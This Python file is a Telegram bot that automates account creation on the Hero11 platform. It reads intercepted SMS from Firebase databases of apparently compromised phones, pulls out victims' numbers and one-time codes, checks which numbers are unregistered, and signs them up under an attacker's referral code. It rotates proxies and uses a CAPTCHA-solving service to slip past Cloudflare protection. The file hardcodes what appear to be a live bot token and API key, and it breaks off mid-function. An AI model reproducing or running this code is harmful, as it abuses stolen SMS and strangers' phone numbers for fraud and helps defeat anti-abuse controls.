import os
import sys
import asyncio
import re
import time
import uuid
import random
import html
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

from curl_cffi import requests as cffi_requests
from curl_cffi.requests import AsyncSession
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==============================================================================
# ⚙️ CONFIGURATION & SECURITY (HERO11 PLATFORM ONLY)
# ==============================================================================
os.environ["TZ"] = "Asia/Kolkata"
if hasattr(time, "tzset"):
    time.tzset()

IST = timezone(timedelta(hours=5, minutes=30))
BOT_TOKEN = os.getenv("BOT_TOKEN", "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM").strip()
ADMIN_ID = int(os.getenv("ADMIN_ID", "8337013809"))
SOLVERIFY_API_KEY = os.getenv("SOLVERIFY_API_KEY", "RqHPFHbQCNwItxqfh21kDmH0Sx2bR0dBdDH1P9QLuFU6hspmbsQIYzxZ5DOURVbg").strip()
OTP_TIMEOUT = 25
POLL_INTERVAL = 2
TIMEOUT = 30

if not BOT_TOKEN or BOT_TOKEN == "ENTER_YOUR_BOT_TOKEN_HERE" or ":" not in BOT_TOKEN:
    print("❌ Invalid or missing BOT_TOKEN. Set BOT_TOKEN in Railway Variables.")
    sys.exit(1)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

USER_DATA = {
    "firebase_dbs": [],
    "codes": [],
    "proxies": [],
    "is_running": False,
    "current_task": None,
    "temp_active_devices": {},
}

class Form(StatesGroup):
    waiting_for_firebase = State()
    waiting_for_codes = State()
    waiting_for_proxies = State()
    waiting_for_check_numbers = State()
    waiting_for_device_id = State()

# ==============================================================================
# 🛒 PROXY NORMALIZATION & HEALTH CHECKER ENGINE
# ==============================================================================
def parse_proxy(line: str) -> str:
    clean = line.strip().replace("http://", "").replace("https://", "")
    if "@" in clean:
        return f"http://{clean}"
    parts = clean.split(":")
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    elif len(parts) == 2:
        return f"http://{clean}"
    return f"http://{clean}"

def test_proxy_sync(proxy: str):
    start = time.time()
    try:
        r = cffi_requests.get(
            "https://api.ipify.org?format=json",
            proxies={"http": proxy, "https": proxy},
            timeout=10,
            impersonate="chrome120",
        )
        latency = time.time() - start
        if r.status_code == 200:
            try:
                ip = r.json().get("ip", "?")
            except Exception:
                ip = "?"
            return True, latency, ip, proxy
        return False, latency, f"HTTP {r.status_code}", proxy
    except Exception as e:
        err = str(e).split("See https")[0].strip()
        return False, time.time() - start, err, proxy

USED_PROXIES = set()

def get_unique_proxy():
    available = [p for p in USER_DATA["proxies"] if p not in USED_PROXIES]
    if not available:
        USED_PROXIES.clear()
        available = USER_DATA["proxies"]
    if available:
        p = random.choice(available)
        USED_PROXIES.add(p)
        return p
    return None

# ==============================================================================
# 🧩 SELECTIVE SOLVERIFY TURNSTILE FALLBACK
# ==============================================================================
async def solve_cloudflare_turnstile(website_url: str, site_key: str, proxy: str = None) -> str:
    if not SOLVERIFY_API_KEY or SOLVERIFY_API_KEY == "YOUR_SOLVERIFY_API_KEY":
        return ""

    create_url = "https://solver.solverify.net/createTask"
    payload = {
        "clientKey": SOLVERIFY_API_KEY,
        "task": {
            "type": "turnstile",
            "websiteURL": website_url,
            "websiteKey": site_key
        }
    }

    if proxy:
        payload["task"]["proxyType"] = "http"
        clean_p = proxy.replace("http://", "").replace("https://", "")
        if "@" in clean_p:
            auth, hp = clean_p.split("@")
            user, pwd = auth.split(":")
            host, port = hp.split(":")
            payload["task"]["proxyAddress"] = host
            payload["task"]["proxyPort"] = str(port)
            payload["task"]["proxyLogin"] = user
            payload["task"]["proxyPassword"] = pwd
        else:
            parts = clean_p.split(":")
            if len(parts) == 4:
                host, port, user, pwd = parts
                payload["task"]["proxyAddress"] = host
                payload["task"]["proxyPort"] = str(port)
                payload["task"]["proxyLogin"] = user
                payload["task"]["proxyPassword"] = pwd
            elif len(parts) == 2:
                host, port = parts
                payload["task"]["proxyAddress"] = host
                payload["task"]["proxyPort"] = str(port)

    try:
        async with AsyncSession() as session:
            resp = await session.post(create_url, json=payload, impersonate="chrome120", timeout=15)
            data = resp.json()
            if data.get("errorId") != 0:
                return ""
            task_id = data.get("taskId")

            result_url = "https://solver.solverify.net/getTaskResult"
            poll_payload = {
                "clientKey": SOLVERIFY_API_KEY,
                "taskId": task_id
            }

            start_time = time.time()
            while time.time() - start_time < 45:
                await asyncio.sleep(2.5)
                res_resp = await session.post(result_url, json=poll_payload, impersonate="chrome120", timeout=10)
                res_data = res_resp.json()
                status = res_data.get("status")
                if status == "completed":
                    solution = res_data.get("solution", {})
                    return solution.get("value", "")
                elif status == "failed":
                    return ""
    except Exception:
        pass
    return ""

# ==============================================================================
# 🛒 HERO11 ASYNC CLIENT ENGINE & HELPERS
# ==============================================================================
def parse_firebase_links(text: str):
    found_links = []
    raw_parts = re.split(r'[\s,\n]+', text)
    for part in raw_parts:
        part = part.strip()
        if not part or part.startswith("#"):
            continue
        part = re.sub(r'https?://', '', part)
        part = part.split('https:')[0].split('http:')[0].split(':')[0].strip('/')
        if part and ("firebaseio.com" in part or "firebasedatabase.app" in part):
            clean_url = f"https://{part}/"
            if clean_url not in found_links:
                found_links.append(clean_url)
    return found_links

def extract_all_phones(messages_dict):
    """Extracts ALL unique 10-digit Indian mobile numbers for a single device's messages."""
    if not messages_dict:
        return []
    ordered_phones = []
    seen = set()

    items = messages_dict.values() if isinstance(messages_dict, dict) else (messages_dict if isinstance(messages_dict, list) else [messages_dict])
    for item in items:
        if isinstance(item, dict):
            # Check dedicated phone/recipient/sender/address fields first, then body/message
            priority_parts = [
                str(item.get(k) or "")
                for k in ("phone", "number", "mobile", "phoneNumber", "recipient", "to", "address", "sender", "title")
            ]
            body_parts = [
                str(item.get(k) or "")
                for k in ("body", "message", "msg", "text")
            ]
            chunks = priority_parts + body_parts
        else:
            chunks = [str(item)]

        for chunk in chunks:
            for match in re.findall(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', chunk):
                if match not in seen:
                    seen.add(match)
                    ordered_phones.append(match)

    return ordered_phones

def message_has_otp_pattern(msg_val) -> bool:
    """Checks if a single message entry contains any OTP message/code pattern."""
    if not isinstance(msg_val, dict):
        return False
    body = str(msg_val.get("body") or msg_val.get("message") or msg_val.get("msg") or "")
    if not body.strip():
        return False

    has_keyword = bool(re.search(r'\b(?:otp|one[\s-]*time[\s-]*password|verification[\s-]*code|passcode|auth[\s-]*code)\b', body, re.IGNORECASE))
    codes = re.findall(r'\b\d{4,8}\b', body)
    filtered_codes = [c for c in codes if c not in {"0000", "1234", "000000", "123456", "111111", "999999", "00000000"}]

    if has_keyword and filtered_codes:
        return True
    if len(filtered_codes) >= 1 and re.search(r'\b(?:code|pin|otp|valid|verify|verification)\b', body, re.IGNORECASE):
        return True
    if any(len(c) == 6 for c in filtered_codes):
        return True
    return False

PUSH_CHARS = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"

def decode_firebase_push_id(push_id: str):
    try:
        if not isinstance(push_id, str) or len(push_id) < 8:
            return None
        timestamp = 0
        for char in push_id[:8]:
            idx = PUSH_CHARS.find(char)
            if idx == -1:
                return None
            timestamp = timestamp * 64 + idx
        if timestamp > 1500000000000:
            return datetime.fromtimestamp(timestamp / 1000.0, tz=IST)
    except Exception:
        pass
    return None

def resolve_message_dt(time_val, msg_key: str = "", ref_now: datetime = None):
    if ref_now is None:
        ref_now = datetime.now(IST)
    dt = None

    try:
        if time_val is not None and str(time_val).strip().upper() not in ["", "N/A", "NONE", "NULL"]:
            if isinstance(time_val, (int, float)):
                val = time_val / 1000.0 if time_val > 100000000000 else time_val
                dt = datetime.fromtimestamp(val, tz=IST)
            else:
                time_str = str(time_val).strip().upper()
                if re.fullmatch(r'\d+(?:\.\d+)?', time_str):
                    val = float(time_str)
                    val = val / 1000.0 if val > 100000000000 else val
                    dt = datetime.fromtimestamp(val, tz=IST)
                else:
                    dt_match = re.search(
                        r'(\d{1,2})[-/](\d{1,2})[-/](\d{4})\s*[\|,@\s]+\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)?',
                        time_str,
                    )
                    if dt_match:
                        d, m, y, h, mn, s, period = dt_match.groups()
                        hour, minute = int(h), int(mn)
                        sec = int(s) if s else 0
                        if period == "PM" and hour != 12:
                            hour += 12
                        elif period == "AM" and hour == 12:
                            hour = 0
                        if 0 <= hour <= 23 and 0 <= minute <= 59 and 0 <= sec <= 59:
                            dt = datetime(int(y), int(m), int(d), hour, minute, sec, tzinfo=IST)
                    else:
                        iso_match = re.search(
                            r'(\d{4})[-/](\d{1,2})[-/](\d{1,2})[T\s]+(\d{1,2}):(\d{2})(?::(\d{2}))?',
                            time_str,
                        )
                        if iso_match:
                            y, m, d, h, mn, s = iso_match.groups()
                            hour, minute = int(h), int(mn)
                            sec = int(s) if s else 0
                            if 0 <= hour <= 23 and 0 <= minute <= 59 and 0 <= sec <= 59:
                                dt = datetime(int(y), int(m), int(d), hour, minute, sec, tzinfo=IST)
                        else:
                            t_match = re.search(r'(?<!\d)(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)?(?!\d)', time_str)
                            if t_match:
                                h, mn, s, period = t_match.groups()
                                hour, minute = int(h), int(mn)
                                sec = int(s) if s else 0
                                if period == "PM" and hour != 12:
                                    hour += 12
                                elif period == "AM" and hour == 12:
                                    hour = 0
                                if 0 <= hour <= 23 and 0 <= minute <= 59 and 0 <= sec <= 59:
                                    dt = datetime(ref_now.year, ref_now.month, ref_now.day, hour, minute, sec, tzinfo=IST)
                                    if dt > ref_now:
                                        if period is None and hour <= 12 and (hour + 12) <= 23:
                                            alt_dt = datetime(ref_now.year, ref_now.month, ref_now.day, hour + 12, minute, sec, tzinfo=IST)
                                            if alt_dt <= ref_now:
                                                dt = alt_dt
                                            else:
                                                dt -= timedelta(days=1)
                                        else:
                                            dt -= timedelta(days=1)

        if dt is None and msg_key:
            dt = decode_firebase_push_id(msg_key)

    except Exception:
        pass

    return dt

def extract_raw_time(m_val):
    if not isinstance(m_val, dict):
        return None
    raw_time = (
        m_val.get("time")
        or m_val.get("timestamp")
        or m_val.get("date")
        or m_val.get("created_at")
        or m_val.get("receivedAt")
        or m_val.get("smsTime")
    )
    if raw_time is None:
        for k, v in m_val.items():
            if any(w in str(k).lower() for w in ["time", "date", "stamp"]):
                raw_time = v
                break
    return raw_time

def message_age_seconds(m_val, msg_key: str = "", now_ist: datetime = None):
    """Returns elapsed seconds in IST for a message, or None if timestamp cannot be determined."""
    if now_ist is None:
        now_ist = datetime.now(IST)
    raw_time = extract_raw_time(m_val)
    dt = resolve_message_dt(raw_time, msg_key=msg_key, ref_now=now_ist)
    if dt is None:
        return None
    diff = (now_ist - dt).total_seconds()
    if diff < -120:
        return None
    return max(0, int(diff))

def has_otp_within_window(msgs, window_minutes: int) -> bool:
    """Checks the device's chat history and returns True only if at least 1 OTP pattern message arrived within window_minutes."""
    if not isinstance(msgs, dict) or not msgs:
        return False
    now_ist = datetime.now(IST)
    max_age_sec = window_minutes * 60

    for m_key, m_val in msgs.items():
        if not message_has_otp_pattern(m_val):
            continue
        age_sec = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
        if age_sec is not None and age_sec <= max_age_sec:
            return True
    return False

def format_relative_time(time_val, msg_key: str = "", idx: int = 0):
    now_ist = datetime.now(IST)
    dt = resolve_message_dt(time_val, msg_key=msg_key, ref_now=now_ist)

    if dt is not None:
        diff_seconds = max(0, int((now_ist - dt).total_seconds()))
        days = diff_seconds // 86400
        if days >= 1:
            return f"{days}d ago"
        hours = diff_seconds // 3600
        if hours >= 1:
            return f"{hours}h ago"
        minutes = diff_seconds // 60
        if minutes >= 1:
            return f"{minutes}m ago"
        return f"{diff_seconds}s ago"

    return f"{idx + 1}m ago"

class AsyncHero11Client:
    BASE_URL = "https://hero11-in.hero11apex.com"
    
    def __init__(self, phone: str, invite_code: str):
        self.phone = re.sub(r'[^0-9+]', '', str(phone))
        if not self.phone.startswith('+'):
            digits = re.sub(r'[^0-9]', '', self.phone)
            if len(digits) == 10:
                self.phone = "+91" + digits
            elif len(digits) >= 10:
                self.phone = "+91" + digits[-10:]
        
        self.invite_code = invite_code
        self.device_id = uuid.uuid4().hex
        self.proxy = get_unique_proxy()
        self.session = AsyncSession(proxy=self.proxy) if self.proxy else AsyncSession()
        self.access_token = None
        self.attribute_uuid = None
        self.cf_token = ""

    async def close(self):
        try:
            await self.session.close()
        except Exception:
            pass

    async def _request(self, method, path, data=None):
        url = self.BASE_URL + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://hero11-in.hero11apex.com",
            "Referer": f"https://hero11-in.hero11apex.com/en/affiliate-invited?c={self.invite_code}&s=1",
            "X-IP-Country": "IN",
            "X-Region": "IN",
            "X-Lang": "en-US",
            "X-Site-Code": "hero11-in",
            "X-UI-Variant": "v2",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Ch-Ua": '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
            "Sec-Ch-Ua-Mobile": "?0",
        }
        if self.proxy:
            headers["X-Proxy-Used"] = "1"
        if self.access_token:
            headers["Authorization"] = self.access_token

        try:
            response = await self.session.request(
                method, url, json=data, headers=headers, impersonate="chrome", timeout=TIMEOUT
            )
            if response.status_code in [403, 503] or "cf-chl" in response.text.lower() or "cloudflare" in response.text.lower():
                solved_token = await solve_cloudflare_turnstile(url, "0x4AAAAAAA...", self.proxy)
                if solved_token:
                    self.cf_token = solved_token
                    headers["X-Cf-Token"] = solved_token
                    if isinstance(data, dict):
                        data["cfToken"] = solved_token
                    response = await self.session.request(
                        method, url, json=data, headers=headers, impersonate="chrome", timeout=TIMEOUT
                    )

            if response.status_code >= 400:
                return None
            return response.json()
        except Exception:
            return None

    async def pre_bind(self):
        payload = {
            "inviteCode": self.invite_code,
            "device": "pc",
            "source": "1",
            "activity": "3",
            "use_type": 1,
            "materialId": 10
        }
        await asyncio.sleep(random.uniform(1.2, 2.5))
        result = await self._request("POST", "/services/user/attribution/v1/attributionLink", data=payload)
        if result and "data" in result and isinstance(result.get("data"), dict):
            self.attribute_uuid = result.get("data", {}).get("uuid") or str(uuid.uuid4())
        else:
            self.attribute_uuid = str(uuid.uuid4())
        return True

    async def black_check(self):
        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "deviceId": self.device_id,
            "loginType": 1,
            "phoneCountryCode": "+91"
        }
        await asyncio.sleep(random.uniform(0.8, 1.5))
        result = await self._request("POST", "/services/user/auth/v1/blackCheck", data=payload)
        if result and "data" in result and isinstance(result.get("data"), dict):
            if result["data"].get("isNew") == 2:
                return "SKIP_EXISTS"
        return "SUCCESS"

    async def send_otp(self):
        await self.pre_bind()
        check = await self.black_check()
        if check == "SKIP_EXISTS":
            return "SKIP_EXISTS"

        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "deviceId": self.device_id,
            "loginType": 1,
            "phoneCountryCode": "+91",
            "cfToken": self.cf_token
        }
        await asyncio.sleep(random.uniform(1.5, 3.0))
        result = await self._request("POST", "/services/user/auth/v1/sendCode", data=payload)
        if result and result.get("code") == 0:
            return "SUCCESS"
        elif result and result.get("code") in [100005, 102018, 102017, 40007]:
            return "SKIP_EXISTS"
        return "FAILED"

    async def verify_otp(self, otp_code):
        if not self.attribute_uuid:
            self.attribute_uuid = str(uuid.uuid4())
        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "code": str(otp_code).strip(),
            "deviceId": self.device_id,
            "deviceInfo": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
            "inviteCode": self.invite_code,
            "loginDeviceType": "1",
            "loginType": 1,
            "countryCode": "IN",
            "phoneCountryCode": "+91",
            "cfToken": self.cf_token,
            "attributeUuid": self.attribute_uuid,
            "distinctId": self.device_id,
            "material_id": 10,
            "hash": "f4ea2d51d0827c5b8c180f4ad7b83ca2"
        }
        await asyncio.sleep(random.uniform(1.0, 2.0))
        result = await self._request("POST", "/services/user/auth/v1/loginWithCode", data=payload)
        if result and result.get("code") == 0:
            self.access_token = result.get("data", {}).get("accessToken")
            user_info = result.get("data", {}).get("user", {})
            if user_info and user_info.get("isRestricted") is True:
                return "IP_LIMITED"
            return "SUCCESS"
        return "INVALID"

async def is_number_unregistered(full_phone: str, invite_code: str, reg_cache: dict) -> bool:
    """Returns True if full_phone is unregistered on Hero11, caching results for speed."""
    if full_phone in reg_cache:
        return reg_cache[full_phone]
    client = AsyncHero11Client(full_phone, invite_code)
    try:
        res = await client.black_check()
        is_unreg = res != "SKIP_EXISTS"
        reg_cache[full_phone] = is_unreg
        return is_unreg
    except Exception:
        return False
    finally:
        await client.close()

async def collect_grouped_unregistered_devices(
    firebase_dbs: list,
    invite_code: str,
    reg_cache: dict,
    skipped_cids: set = None,
    skipped_phones: set = None,
    used_phones: set = None,
    window_minutes: int = None,
    limit: int = 30,
):
    """
    Scans online devices and returns a list of dicts grouped per unique device ID (`cid`):
    {
        "firebase_url": fb_url,
        "db_short_id": db_short_id,
        "cid": cid,
        "msgs": msgs,
        "unreg_phones": ["+91...", ...],
        "min_age_sec": int or None,
    }
    """
    import aiohttp
    skipped_cids = skipped_cids or set()
    skipped_phones = skipped_phones or set()
    used_phones = used_phones or set()
    now_ist = datetime.now(IST)
    max_age_sec = (window_minutes * 60) if window_minutes is not None else None

    grouped_results = []
    seen_device_keys = set()

    async with aiohttp.ClientSession() as session:
        for fb_url in firebase_dbs:
            db_short_id = fb_url.split('//')[1].split('.')[0][:8]
            try:
                async with session.get(f"{fb_url}clients.json", timeout=8) as r:
                    clients_data = await r.json() or {}

                for cid, cdata in clients_data.items():
                    if cid in skipped_cids:
                        continue
                    device_key = f"{db_short_id}:{cid}"
                    if device_key in seen_device_keys:
                        continue

                    if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                        try:
                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}', timeout=6) as m_req:
                                msgs = await m_req.json()
                                if not isinstance(msgs, dict) or not msgs:
                                    continue

                                if window_minutes is not None and not has_otp_within_window(msgs, window_minutes):
                                    skipped_cids.add(cid)
                                    continue

                                raw_phones = extract_all_phones(msgs)
                                unreg_phones = []
                                for p in raw_phones:
                                    full_phone = "+91" + p
                                    if full_phone in skipped_phones or full_phone in used_phones:
                                        continue
                                    if await is_number_unregistered(full_phone, invite_code, reg_cache):
                                        unreg_phones.append(full_phone)
                                    else:
                                        skipped_phones.add(full_phone)

                                if not unreg_phones:
                                    skipped_cids.add(cid)
                                    continue

                                ages = []
                                for m_key, m_val in msgs.items():
                                    if isinstance(m_val, dict):
                                        age = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
                                        if age is not None:
                                            if max_age_sec is None or age <= max_age_sec:
                                                ages.append(age)

                                seen_device_keys.add(device_key)
                                grouped_results.append({
                                    "firebase_url": fb_url,
                                    "db_short_id": db_short_id,
                                    "cid": cid,
                                    "msgs": msgs,
                                    "unreg_phones": unreg_phones,
                                    "min_age_sec": min(ages) if ages else None,
                                })
                        except Exception:
                            pass
            except Exception:
                pass

    return grouped_results

# ==============================================================================
# 🤖 TELEGRAM KEYBOARDS & INTERACTIVE MENUS
# ==============================================================================
def get_main_menu():
    if USER_DATA["is_running"]:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🛑 Stop Automation", callback_data="stop_automation")]
        ])
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Add Firebase(s)", callback_data="add_firebase"),
         InlineKeyboardButton(text="🗑️ Clear Firebase", callback_data="clear_firebase")],
        [InlineKeyboardButton(text="📝 Add Refer Code (Max 1)", callback_data="add_codes"),
         InlineKeyboardButton(text="🌐 Add Proxies (HTTP)", callback_data="add_proxies")],
        [InlineKeyboardButton(text="🗑️ Clear Proxies", callback_data="clear_proxies"),
         InlineKeyboardButton(text="🟢 Check Online Devices", callback_data="check_devices")],
        [InlineKeyboardButton(text="📊 Check Number Status", callback_data="check_numbers_menu"),
         InlineKeyboardButton(text="🔢 Scan All Numbers by ID", callback_data="scan_id_numbers_menu")],
        [InlineKeyboardButton(text="💬 History (< 10m)", callback_data="hist_win_10"),
         InlineKeyboardButton(text="💬 History (< 1h)", callback_data="hist_win_60"),
         InlineKeyboardButton(text="💬 History (< 24h)", callback_data="hist_win_1440")],
        [InlineKeyboardButton(text="📋 View Active Devices & SMS", callback_data="view_active_sms"),
         InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies")],
        [InlineKeyboardButton(text="🚀 Start (OTP < 10m)", callback_data="start_auto_10"),
         InlineKeyboardButton(text="🚀 Start (OTP < 1h)", callback_data="start_auto_60"),
         InlineKeyboardButton(text="🚀 Start (OTP < 24h)", callback_data="start_auto_1440")]
    ])

class LiveLogger:
    def __init__(self, message: types.Message):
        self.message = message
        self.last_update = 0
        self.last_text = ""

    async def set_text(self, text, force=False):
        if text == self.last_text:
            return
        now = time.time()
        if force or (now - self.last_update > 1.0):
            try:
                await self.message.edit_text(f"<code>{html.escape(text)}</code>", parse_mode="HTML", reply_markup=get_main_menu())
                self.last_update = time.time()
                self.last_text = text
            except Exception:
                pass

@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await state.clear()
    current_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "Not Set ❌"
    text = (
        "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
        f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
        f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n\n"
        "Select an option below:"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=get_main_menu())

@dp.callback_query(F.data == "add_firebase")
async def cb_add_firebase(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await state.set_state(Form.waiting_for_firebase)
    await callback.message.answer("🔗 Please send your Firebase RTDB link(s) (single or multiple, one per line or separated):")
    await callback.answer()

@dp.message(Form.waiting_for_firebase)
async def process_firebase_input(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    parsed_list = parse_firebase_links(message.text)
    if not parsed_list:
        await message.answer("❌ No valid Firebase URLs detected. Try again:")
        return
    USER_DATA["firebase_dbs"].extend([url for url in parsed_list if url not in USER_DATA["firebase_dbs"]])
    await state.clear()
    await message.answer(f"✅ Added successfully! Total Firebase databases loaded: {len(USER_DATA['firebase_dbs'])}", parse_mode="HTML", reply_markup=get_main_menu())

@dp.callback_query(F.data == "clear_firebase")
async def cb_clear_firebase(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    USER_DATA["firebase_dbs"] = []
    await callback.message.answer("🗑️ <b>All Firebase databases cleared successfully!</b>", parse_mode="HTML", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data == "clear_proxies")
async def cb_clear_proxies(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    USER_DATA["proxies"] = []
    USED_PROXIES.clear()
    await callback.message.answer("🗑️ <b>All proxies cleared successfully!</b>", parse_mode="HTML", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data == "add_codes")
async def cb_add_codes(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await state.set_state(Form.waiting_for_codes)
    await callback.message.answer("📝 Please send your <b>single</b> referral code (strictly max 1 allowed):")
    await callback.answer()

@dp.message(Form.waiting_for_codes)
async def process_codes_input(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    code = message.text.strip().upper()
    if not code:
        await message.answer("❌ Code cannot be empty. Try again:")
        return
    USER_DATA["codes"] = [code]
    await state.clear()
    await message.answer(f"✅ Active Refer Code set to: <code>{html.escape(code)}</code> (Strictly 1 code max)", parse_mode="HTML", reply_markup=get_main_menu())

@dp.callback_query(F.data == "add_proxies")
async def cb_add_proxies(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await state.set_state(Form.waiting_for_proxies)
    await callback.message.answer("🌐 Please send your HTTP proxies (one per line, format: `ip:port:user:pass`, `user:pass@ip:port`, or `http://ip:port`):")
    await callback.answer()

@dp.message(Form.waiting_for_proxies)
async def process_proxies_input(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    new_proxies = []
    for line in message.text.split("\n"):
        line = line.strip()
        if line and not line.startswith("#"):
            new_proxies.append(parse_proxy(line))
    USER_DATA["proxies"].extend(new_proxies)
    await state.clear()
    await message.answer(f"✅ Added {len(new_proxies)} normalized HTTP proxies! Total loaded: {len(USER_DATA['proxies'])}", parse_mode="HTML", reply_markup=get_main_menu())

@dp.callback_query(F.data == "check_devices")
async def cb_check_devices(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if not USER_DATA["firebase_dbs"]:
        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
        return

    await callback.message.answer("🔍 Scanning all loaded Firebase databases for online devices...")
    try:
        total_online_count = 0
        import aiohttp
        async with aiohttp.ClientSession() as session:
            for fb_url in USER_DATA["firebase_dbs"]:
                try:
                    async with session.get(f"{fb_url}clients.json", timeout=8) as r:
                        clients_data = await r.json() or {}
                        for cid, cdata in clients_data.items():
                            if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                total_online_count += 1
                except Exception:
                    pass
        await callback.message.answer(f"🟢 <b>Total Exact Online Devices Count Across All DBs:</b> {total_online_count}", parse_mode="HTML", reply_markup=get_main_menu())
    except Exception as e:
        await callback.message.answer(f"❌ Error checking devices: {html.escape(str(e))}", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data == "check_numbers_menu")
async def cb_check_numbers_menu(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await state.set_state(Form.waiting_for_check_numbers)
    await callback.message.answer(
        "📊 <b>Number Registration Checker</b>\n\n"
        "Please send phone number(s) to check (single or multiple, line by line, with or without +91):"
    )
    await callback.answer()

@dp.message(Form.waiting_for_check_numbers)
async def process_check_numbers_input(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    raw_text = message.text.strip()
    lines = [line.strip() for line in raw_text.split("\n") if line.strip()]
    if not lines:
        await message.answer("❌ No valid numbers provided. Try again:")
        return

    status_msg = await message.answer(f"🔍 Checking registration status for {len(lines)} number(s)...")
    results = []
    default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"

    for line in lines:
        digits = re.sub(r'[^0-9]', '', line)
        if len(digits) >= 10:
            phone_num = "+91" + digits[-10:]
            client = AsyncHero11Client(phone_num, default_code)
            try:
                check_res = await client.black_check()
                if check_res == "SKIP_EXISTS":
                    results.append(f"• <code>{html.escape(phone_num)}</code>: 🔴 <b>Already Registered</b>")
                else:
                    results.append(f"• <code>{html.escape(phone_num)}</code>: 🟢 <b>Unregistered / Available</b>")
            except Exception:
                results.append(f"• <code>{html.escape(phone_num)}</code>: ⚠️ Error checking")
            finally:
                await client.close()
        else:
            results.append(f"• <code>{html.escape(line)}</code>: ❌ Invalid Number format")

    await state.clear()
    await status_msg.edit_text(
        f"📊 <b>Number Checker Results:</b>\n\n" + "\n".join(results),
        parse_mode="HTML",
        reply_markup=get_main_menu()
    )

@dp.callback_query(F.data == "scan_id_numbers_menu")
async def cb_scan_id_numbers_menu(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    if not USER_DATA["firebase_dbs"]:
        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
        return
    await state.set_state(Form.waiting_for_device_id)
    await callback.message.answer(
        "🔢 <b>Scan All Numbers Inside Device ID(s)</b>\n\n"
        "Send one or more Device IDs (e.g. <code>552f6ab05a93823d</code>), or send <code>ALL</code> to scan all online IDs:"
    )
    await callback.answer()

@dp.message(Form.waiting_for_device_id)
async def process_device_id_scan(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    raw_input = message.text.strip()
    if not raw_input:
        await message.answer("❌ Please send a Device ID or ALL:")
        return

    scan_all = raw_input.upper() == "ALL"
    target_cids = set() if scan_all else {x.strip() for x in re.split(r'[\s,\n]+', raw_input) if x.strip()}

    status_msg = await message.answer("🔍 Scanning Firebase for all numbers inside target Device ID(s)...")
    await state.clear()

    try:
        import aiohttp
        default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
        report_blocks = []

        async with aiohttp.ClientSession() as session:
